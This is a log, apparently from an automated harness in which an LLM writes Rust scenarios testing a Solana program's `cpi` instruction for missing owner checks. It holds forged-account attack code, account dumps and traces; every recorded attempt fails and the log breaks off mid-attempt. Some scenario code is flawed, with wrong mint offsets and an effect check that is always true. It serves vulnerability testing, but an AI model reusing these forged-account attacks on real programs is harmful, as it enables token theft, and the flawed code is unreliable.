@@ -1,0 +1,631 @@
+{
+  "category": "OWNER",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "Failure(InvalidAccountData)",
+  "reason": "o baseline 'transferencia legitima via CPI' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2275,
+        "completion_tokens": 1616,
+        "latency_s": 7.43
+      },
+      "raw": "{\n  \"plan\": \"O programa-alvo expõe a instrução `cpi`, que recebe `source`, `destination`, `authority` e `token_program` como `AccountInfo` genéricas e faz uma CPI para o SPL Token sem validar o dono das contas. O baseline usa contas de token legítimas (dono = SPL Token Program) e deve ter sucesso. O ataque substitui `source` e `destination` por contas forjadas com dono diferente (ex.: o próprio programa-alvo ou um programa atacante), mantendo o mesmo layout de dados de token, para verificar se a CPI é executada mesmo assim. O efeito mede se a conta forjada foi aceita e usada, comparando o dono da conta resultante com o dono esperado do SPL Token.\",\n  \"scenario\": \"let env = Env::load();\\n\\n// Contas de token legítimas (dono = SPL Token Program)\\nlet spl_token_id = Pubkey::new_unique(); // placeholder; o harness não expõe spl_token::ID diretamente\\n// Na prática, o SPL Token Program já está carregado no Mollusk; usamos seu ID conhecido.\\nlet spl_token_id = solana_program::pubkey!(\\\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\\\");\\n\\nlet authority = Pubkey::new_unique();\\nlet source_legit = Pubkey::new_unique();\\nlet dest_legit = Pubkey::new_unique();\\n\\n// Layout mínimo de uma conta de token SPL: mint (32) + owner (32) + amount (8) + ...\\n// Para o baseline, basta que as contas existam com dono SPL Token; a CPI de transfer\\n// falharia por falta de saldo, mas o baseline precisa ter sucesso.\\n// Portanto, usamos contas com saldo suficiente e mint válido.\\n// Como não temos o mint real, usamos um mint fictício com dono SPL Token.\\nlet mint = Pubkey::new_unique();\\nlet mut source_data = vec![0u8; 165];\\nsource_data[0..32].copy_from_slice(mint.as_ref());\\nsource_data[32..64].copy_from_slice(authority.as_ref());\\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nlet source_legit_account = account(&spl_token_id, &source_data, None);\\n\\nlet mut dest_data = vec![0u8; 165];\\ndest_data[0..32].copy_from_slice(mint.as_ref());\\ndest_data[32..64].copy_from_slice(authority.as_ref());\\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\nlet token_program_account = program_account(&spl_token_id);\\n\\nlet contas_baseline = vec![\\n    (source_legit, source_legit_account.clone()),\\n    (dest_legit, dest_legit_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_legit, false),\\n        AccountMeta::new(dest_legit, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"transferência legítima via CPI\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: substituir source e destination por contas forjadas com dono diferente\\nlet attacker_owner = env.program_id; // dono forjado: o próprio programa-alvo\\nlet source_forged = Pubkey::new_unique();\\nlet dest_forged = Pubkey::new_unique();\\n\\nlet mut source_forged_data = vec![0u8; 165];\\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nlet source_forged_account = account(&attacker_owner, &source_forged_data, None);\\n\\nlet mut dest_forged_data = vec![0u8; 165];\\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\nlet dest_forged_account = account(&attacker_owner, &dest_forged_data, None);\\n\\nlet contas_ataque = vec![\\n    (source_forged, source_forged_account.clone()),\\n    (dest_forged, dest_forged_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_forged, false),\\n        AccountMeta::new(dest_forged, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\n\\nlet r_ataque = env.attack(\\\"CPI com contas forjadas de dono diferente\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    // O dano: a conta forjada foi aceita e usada; seu dono permanece diferente do SPL Token\\n    let source_after = after(&r_ataque, &source_forged);\\n    let dest_after = after(&r_ataque, &dest_forged);\\n    env.effect(\\n        \\\"conta forjada aceita com dono diferente do SPL Token\\\",\\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\\n    );\\n    env.effect(\\n        \\\"saldo da conta forjada foi alterado pela CPI\\\",\\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\\n    );\\n}\"\n}",
+      "plan": "O programa-alvo expõe a instrução `cpi`, que recebe `source`, `destination`, `authority` e `token_program` como `AccountInfo` genéricas e faz uma CPI para o SPL Token sem validar o dono das contas. O baseline usa contas de token legítimas (dono = SPL Token Program) e deve ter sucesso. O ataque substitui `source` e `destination` por contas forjadas com dono diferente (ex.: o próprio programa-alvo ou um programa atacante), mantendo o mesmo layout de dados de token, para verificar se a CPI é executada mesmo assim. O efeito mede se a conta forjada foi aceita e usada, comparando o dono da conta resultante com o dono esperado do SPL Token.",
+      "scenario": "let env = Env::load();\n\n// Contas de token legítimas (dono = SPL Token Program)\nlet spl_token_id = Pubkey::new_unique(); // placeholder; o harness não expõe spl_token::ID diretamente\n// Na prática, o SPL Token Program já está carregado no Mollusk; usamos seu ID conhecido.\nlet spl_token_id = solana_program::pubkey!(\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\");\n\nlet authority = Pubkey::new_unique();\nlet source_legit = Pubkey::new_unique();\nlet dest_legit = Pubkey::new_unique();\n\n// Layout mínimo de uma conta de token SPL: mint (32) + owner (32) + amount (8) + ...\n// Para o baseline, basta que as contas existam com dono SPL Token; a CPI de transfer\n// falharia por falta de saldo, mas o baseline precisa ter sucesso.\n// Portanto, usamos contas com saldo suficiente e mint válido.\n// Como não temos o mint real, usamos um mint fictício com dono SPL Token.\nlet mint = Pubkey::new_unique();\nlet mut source_data = vec![0u8; 165];\nsource_data[0..32].copy_from_slice(mint.as_ref());\nsource_data[32..64].copy_from_slice(authority.as_ref());\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nlet source_legit_account = account(&spl_token_id, &source_data, None);\n\nlet mut dest_data = vec![0u8; 165];\ndest_data[0..32].copy_from_slice(mint.as_ref());\ndest_data[32..64].copy_from_slice(authority.as_ref());\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\n\nlet authority_account = wallet(1_000_000_000);\nlet token_program_account = program_account(&spl_token_id);\n\nlet contas_baseline = vec![\n    (source_legit, source_legit_account.clone()),\n    (dest_legit, dest_legit_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_legit, false),\n        AccountMeta::new(dest_legit, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\n\nlet r_baseline = env.baseline(\"transferência legítima via CPI\", &ix_baseline, &contas_baseline);\n\n// Ataque: substituir source e destination por contas forjadas com dono diferente\nlet attacker_owner = env.program_id; // dono forjado: o próprio programa-alvo\nlet source_forged = Pubkey::new_unique();\nlet dest_forged = Pubkey::new_unique();\n\nlet mut source_forged_data = vec![0u8; 165];\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nlet source_forged_account = account(&attacker_owner, &source_forged_data, None);\n\nlet mut dest_forged_data = vec![0u8; 165];\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\nlet dest_forged_account = account(&attacker_owner, &dest_forged_data, None);\n\nlet contas_ataque = vec![\n    (source_forged, source_forged_account.clone()),\n    (dest_forged, dest_forged_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n];\n\nlet ix_ataque = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_forged, false),\n        AccountMeta::new(dest_forged, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\n\nlet r_ataque = env.attack(\"CPI com contas forjadas de dono diferente\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    // O dano: a conta forjada foi aceita e usada; seu dono permanece diferente do SPL Token\n    let source_after = after(&r_ataque, &source_forged);\n    let dest_after = after(&r_ataque, &dest_forged);\n    env.effect(\n        \"conta forjada aceita com dono diferente do SPL Token\",\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\n    );\n    env.effect(\n        \"saldo da conta forjada foi alterado pela CPI\",\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "setup",
+            "attacker_program": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh"
+          },
+          {
+            "step": "baseline",
+            "note": "transferência legítima via CPI",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000007",
+                "digest": "06d5e3073b8bed50",
+                "post": "00000000000000070000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000007",
+                "digest": "a64fd400784ac606",
+                "post": "000000000000000700000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "CPI com contas forjadas de dono diferente",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111114DhpssPJgSi1YU7hCMfYt1BJ334YgsffXm",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000007",
+                "digest": "06d5e3073b8bed50",
+                "post": "00000000000000070000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111114d3RrygbPdAtMuFnDmzsN8T5fYKVQ7FVr7",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000007",
+                "digest": "a64fd400784ac606",
+                "post": "000000000000000700000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferência legítima via CPI' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3642,
+        "completion_tokens": 201,
+        "latency_s": 2.54
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque as contas de token SPL forjadas manualmente não passam na validação do SPL Token Program (mint inválido, sem conta de mint real). Para o baseline ter sucesso, é preciso criar um mint real e contas de token reais via CPI ao SPL Token Program, mas o harness não permite invocar o SPL Token Program diretamente. Alternativamente, o baseline pode ser uma instrução que não dependa de contas de token válidas. Como a instrução-alvo é `cpi` e ela sempre invoca o SPL Token Program, o baseline precisa de contas de token válidas. Sem poder criar mint/contas de token reais, o cenário não pode ser montado corretamente. Portanto, a hipótese não pode ser testada com este harness e o ataque não pode ser confirmado.\", \"conclusion\": \"blocked\"}",
+      "plan": "O baseline falhou porque as contas de token SPL forjadas manualmente não passam na validação do SPL Token Program (mint inválido, sem conta de mint real). Para o baseline ter sucesso, é preciso criar um mint real e contas de token reais via CPI ao SPL Token Program, mas o harness não permite invocar o SPL Token Program diretamente. Alternativamente, o baseline pode ser uma instrução que não dependa de contas de token válidas. Como a instrução-alvo é `cpi` e ela sempre invoca o SPL Token Program, o baseline precisa de contas de token válidas. Sem poder criar mint/contas de token reais, o cenário não pode ser montado corretamente. Portanto, a hipótese não pode ser testada com este harness e o ataque não pode ser confirmado.",
+      "problem": "blocked sem ataque rejeitado"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3703,
+        "completion_tokens": 1575,
+        "latency_s": 6.63
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque as contas de token SPL foram montadas com layout inválido (mint fictício sem conta de mint real e sem saldo). Para o baseline ter sucesso, é preciso criar uma conta de mint SPL Token válida e contas de token com saldo, todas com dono SPL Token. O ataque substitui source/destination por contas com dono diferente (o próprio programa-alvo), mantendo o mesmo layout de dados; se a CPI aceitar essas contas forjadas, o dano é que uma conta com dono diferente do SPL Token foi usada na transferência.\", \"scenario\": \"let env = Env::load();\\n\\nlet spl_token_id = solana_program::pubkey!(\\\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\\\");\\nlet authority = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\n// Conta de mint SPL Token válida (dono = SPL Token, decimals=0, supply=1000)\\nlet mut mint_data = vec![0u8; 82];\\nmint_data[0..4].copy_from_slice(&0u32.to_le_bytes()); // mint_authority option = None\\nmint_data[4..12].copy_from_slice(&1000u64.to_le_bytes()); // supply\\nmint_data[12] = 0; // decimals\\nmint_data[13] = 1; // is_initialized\\nlet mint_account = account(&spl_token_id, &mint_data, None);\\n\\n// Conta de token source com saldo 1000\\nlet mut source_data = vec![0u8; 165];\\nsource_data[0..32].copy_from_slice(mint.as_ref());\\nsource_data[32..64].copy_from_slice(authority.as_ref());\\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nsource_data[108] = 1; // state = initialized\\nlet source_legit = Pubkey::new_unique();\\nlet source_legit_account = account(&spl_token_id, &source_data, None);\\n\\n// Conta de token destination com saldo 0\\nlet mut dest_data = vec![0u8; 165];\\ndest_data[0..32].copy_from_slice(mint.as_ref());\\ndest_data[32..64].copy_from_slice(authority.as_ref());\\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\ndest_data[108] = 1;\\nlet dest_legit = Pubkey::new_unique();\\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\nlet token_program_account = program_account(&spl_token_id);\\n\\nlet contas_baseline = vec![\\n    (source_legit, source_legit_account.clone()),\\n    (dest_legit, dest_legit_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n    (mint, mint_account.clone()),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_legit, false),\\n        AccountMeta::new(dest_legit, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"transferencia legitima via CPI\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: source/destination com dono diferente do SPL Token (dono = programa-alvo)\\nlet source_forged = Pubkey::new_unique();\\nlet dest_forged = Pubkey::new_unique();\\n\\nlet mut source_forged_data = vec![0u8; 165];\\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\\nsource_forged_data[108] = 1;\\nlet source_forged_account = account(&env.program_id, &source_forged_data, None);\\n\\nlet mut dest_forged_data = vec![0u8; 165];\\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\ndest_forged_data[108] = 1;\\nlet dest_forged_account = account(&env.program_id, &dest_forged_data, None);\\n\\nlet contas_ataque = vec![\\n    (source_forged, source_forged_account.clone()),\\n    (dest_forged, dest_forged_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n    (mint, mint_account.clone()),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source_forged, false),\\n        AccountMeta::new(dest_forged, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\n\\nlet r_ataque = env.attack(\\\"CPI com contas forjadas de dono diferente\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let source_after = after(&r_ataque, &source_forged);\\n    let dest_after = after(&r_ataque, &dest_forged);\\n    env.effect(\\n        \\\"conta forjada aceita com dono diferente do SPL Token\\\",\\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\\n    );\\n    env.effect(\\n        \\\"saldo da conta forjada foi alterado pela CPI\\\",\\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\\n    );\\n}\\n\"}",
+      "plan": "O baseline falhou porque as contas de token SPL foram montadas com layout inválido (mint fictício sem conta de mint real e sem saldo). Para o baseline ter sucesso, é preciso criar uma conta de mint SPL Token válida e contas de token com saldo, todas com dono SPL Token. O ataque substitui source/destination por contas com dono diferente (o próprio programa-alvo), mantendo o mesmo layout de dados; se a CPI aceitar essas contas forjadas, o dano é que uma conta com dono diferente do SPL Token foi usada na transferência.",
+      "scenario": "let env = Env::load();\n\nlet spl_token_id = solana_program::pubkey!(\"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA\");\nlet authority = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\n// Conta de mint SPL Token válida (dono = SPL Token, decimals=0, supply=1000)\nlet mut mint_data = vec![0u8; 82];\nmint_data[0..4].copy_from_slice(&0u32.to_le_bytes()); // mint_authority option = None\nmint_data[4..12].copy_from_slice(&1000u64.to_le_bytes()); // supply\nmint_data[12] = 0; // decimals\nmint_data[13] = 1; // is_initialized\nlet mint_account = account(&spl_token_id, &mint_data, None);\n\n// Conta de token source com saldo 1000\nlet mut source_data = vec![0u8; 165];\nsource_data[0..32].copy_from_slice(mint.as_ref());\nsource_data[32..64].copy_from_slice(authority.as_ref());\nsource_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nsource_data[108] = 1; // state = initialized\nlet source_legit = Pubkey::new_unique();\nlet source_legit_account = account(&spl_token_id, &source_data, None);\n\n// Conta de token destination com saldo 0\nlet mut dest_data = vec![0u8; 165];\ndest_data[0..32].copy_from_slice(mint.as_ref());\ndest_data[32..64].copy_from_slice(authority.as_ref());\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\ndest_data[108] = 1;\nlet dest_legit = Pubkey::new_unique();\nlet dest_legit_account = account(&spl_token_id, &dest_data, None);\n\nlet authority_account = wallet(1_000_000_000);\nlet token_program_account = program_account(&spl_token_id);\n\nlet contas_baseline = vec![\n    (source_legit, source_legit_account.clone()),\n    (dest_legit, dest_legit_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n    (mint, mint_account.clone()),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_legit, false),\n        AccountMeta::new(dest_legit, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\n\nlet r_baseline = env.baseline(\"transferencia legitima via CPI\", &ix_baseline, &contas_baseline);\n\n// Ataque: source/destination com dono diferente do SPL Token (dono = programa-alvo)\nlet source_forged = Pubkey::new_unique();\nlet dest_forged = Pubkey::new_unique();\n\nlet mut source_forged_data = vec![0u8; 165];\nsource_forged_data[0..32].copy_from_slice(mint.as_ref());\nsource_forged_data[32..64].copy_from_slice(authority.as_ref());\nsource_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());\nsource_forged_data[108] = 1;\nlet source_forged_account = account(&env.program_id, &source_forged_data, None);\n\nlet mut dest_forged_data = vec![0u8; 165];\ndest_forged_data[0..32].copy_from_slice(mint.as_ref());\ndest_forged_data[32..64].copy_from_slice(authority.as_ref());\ndest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());\ndest_forged_data[108] = 1;\nlet dest_forged_account = account(&env.program_id, &dest_forged_data, None);\n\nlet contas_ataque = vec![\n    (source_forged, source_forged_account.clone()),\n    (dest_forged, dest_forged_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n    (mint, mint_account.clone()),\n];\n\nlet ix_ataque = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source_forged, false),\n        AccountMeta::new(dest_forged, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\n\nlet r_ataque = env.attack(\"CPI com contas forjadas de dono diferente\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let source_after = after(&r_ataque, &source_forged);\n    let dest_after = after(&r_ataque, &dest_forged);\n    env.effect(\n        \"conta forjada aceita com dono diferente do SPL Token\",\n        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,\n    );\n    env.effect(\n        \"saldo da conta forjada foi alterado pela CPI\",\n        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "setup",
+            "attacker_program": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh"
+          },
+          {
+            "step": "baseline",
+            "note": "transferencia legitima via CPI",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "ed5a61a324ab1726",
+                "post": "00000000000000040000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "cfe07edda73017e4",
+                "post": "000000000000000400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "CPI com contas forjadas de dono diferente",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111113pNDtm61yGF8j2ycAwLEPsuWQXobye5qDR",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "ed5a61a324ab1726",
+                "post": "00000000000000040000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111114DhpssPJgSi1YU7hCMfYt1BJ334YgsffXm",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "cfe07edda73017e4",
